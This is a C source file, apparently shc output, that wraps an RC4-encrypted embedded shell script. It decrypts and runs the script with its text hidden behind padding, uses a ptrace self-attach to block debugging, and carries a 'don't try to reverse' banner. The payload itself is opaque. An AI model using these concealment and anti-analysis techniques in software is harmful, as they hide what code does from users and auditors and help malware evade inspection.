#if 0
	UNKNOWN CODE DON'T TRY TO REVERSE

 
#endif

static  char data [] = 
#define      opts_z	1
#define      opts	((&data[0]))
	"\130"
#define      lsto_z	1
#define      lsto	((&data[1]))
	"\361"
#define      pswd_z	256
#define      pswd	((&data[51]))
	"\173\237\265\266\267\072\047\352\371\043\064\156\204\274\300\044"
	"\056\133\062\347\224\127\250\022\372\036\262\267\043\165\372\237"
	"\025\260\126\314\352\176\267\343\241\353\122\046\250\022\113\326"
	"\156\375\137\046\014\362\033\043\117\070\202\175\332\000\156\177"
	"\340\000\367\054\067\335\360\372\214\331\147\343\355\111\100\175"
	"\106\240\244\123\223\300\167\342\370\371\137\323\372\315\122\332"
	"\315\112\007\004\050\370\377\265\321\146\230\276\260\331\074\367"
	"\171\340\112\014\240\302\356\231\273\116\155\266\033\277\221\351"
	"\012\230\356\062\220\355\347\142\124\200\040\004\131\135\373\322"
	"\075\106\337\336\011\316\170\304\034\346\172\070\246\013\041\260"
	"\244\020\343\065\376\313\227\123\113\270\130\244\025\124\167\123"
	"\233\127\062\244\045\253\150\101\221\343\171\067\357\233\350\223"
	"\254\313\310\252\226\140\376\341\030\126\206\056\252\376\201\105"
	"\125\264\351\172\137\122\274\361\065\065\050\044\321\020\270\175"
	"\333\201\050\162\341\046\124\372\174\332\050\046\331\252\153\056"
	"\136\125\251\276\247\146\257\334\233\327\001\155\350\271\352\304"
	"\072\023\066\034\071\212\026\266\145\076\334\076\351\110\155\110"
	"\236\027\006\105\175\266\041\031\216\043\207\166\334\161\072\027"
	"\205\161\063\276\373\111\165\141\210\122\237\161\232\015\271\070"
	"\045\176\276\002\325\146\024\320\205\306\207\250\074\201\110\122"
	"\061\236"
#define      msg1_z	42
#define      msg1	((&data[325]))
	"\326\011\347\004\262\267\256\320\364\325\121\103\267\326\117\361"
	"\157\120\331\061\276\266\315\050\212\260\033\257\346\177\060\205"
	"\053\346\021\273\056\314\314\344\306\051\261\000"
#define      text_z	62
#define      text	((&data[380]))
	"\345\153\145\061\102\323\257\000\326\204\146\352\255\355\012\157"
	"\027\132\162\001\322\071\232\043\144\342\175\157\340\071\345\057"
	"\116\033\163\111\050\070\221\022\005\336\271\331\320\024\156\135"
	"\001\045\254\374\017\333\372\006\375\127\106\250\206\110\322\326"
	"\350\376\154\321\332\301\316\262\133\110\125\353\261\334\224"
#define      tst2_z	19
#define      tst2	((&data[448]))
	"\100\262\065\213\240\216\345\037\247\112\206\301\325\244\377\006"
	"\256\133\342\240\220\173\137\254"
#define      chk1_z	22
#define      chk1	((&data[472]))
	"\126\351\054\073\251\361\062\072\273\175\052\350\314\134\244\226"
	"\153\262\163\036\143\021\114\371\000\073\144"
#define      xecc_z	15
#define      xecc	((&data[499]))
	"\071\043\020\317\366\212\007\077\137\241\372\317\302\112\303\213"
	"\033\247"
#define      date_z	1
#define      date	((&data[516]))
	"\172"
#define      chk2_z	19
#define      chk2	((&data[521]))
	"\253\322\216\232\157\120\256\335\350\357\327\262\353\247\132\002"
	"\170\110\355\122\151\306\075\060\153\332\301"
#define      shll_z	10
#define      shll	((&data[544]))
	"\255\072\065\352\030\303\172\241\304\230\176"
#define      tst1_z	22
#define      tst1	((&data[555]))
	"\271\223\132\203\222\176\233\200\222\361\331\361\110\122\026\172"
	"\060\224\363\352\172\220\152\032\020\316"
#define      msg2_z	19
#define      msg2	((&data[583]))
	"\272\231\267\230\305\223\102\033\367\007\072\344\154\005\200\015"
	"\330\055\147\361\306\034\311"
#define      inlo_z	3
#define      inlo	((&data[604]))
	"\323\375\326"
#define      rlax_z	1
#define      rlax	((&data[607]))
	"\157"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
